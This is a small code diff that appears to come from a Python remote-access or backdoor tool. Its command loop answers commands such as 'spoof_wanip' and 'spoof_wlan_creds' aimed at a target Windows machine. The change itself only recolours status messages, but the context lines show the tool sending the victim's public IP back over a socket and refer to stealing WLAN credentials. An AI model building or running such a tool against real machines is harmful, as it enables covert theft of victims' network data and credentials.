@@ -239,7 +239,7 @@ def shell():
 		# Spoof wan/public ip of trgt win10 machine  ✓
 		elif cmd[:11] == "spoof_wanip" and len(cmd) > 1:
 
-			send_eff(colored("[+] Wan/Public ip of trgt windows machine: ", 'green'))
+			send_eff(colored("[+] Wan/Public ip of trgt windows machine: ", 'cyan'))
 
 			w = wan_ip()
 
@@ -252,10 +252,10 @@ def shell():
 		elif cmd[:16] == "spoof_wlan_creds" and len(cmd) > 1:
 
 			# Printing trgt's wan.public ip
-			send_eff(colored("[+] Wan/Public ip of trgt windows machine: ", 'green'))
+			send_eff(colored("[+] Wan/Public ip of trgt windows machine: ", 'cyan'))
 
 			w = wan_ip()
-			
+
 			sock.send(w.encode('utf-8'))  # Encoding to send data
 
 			data = Main()
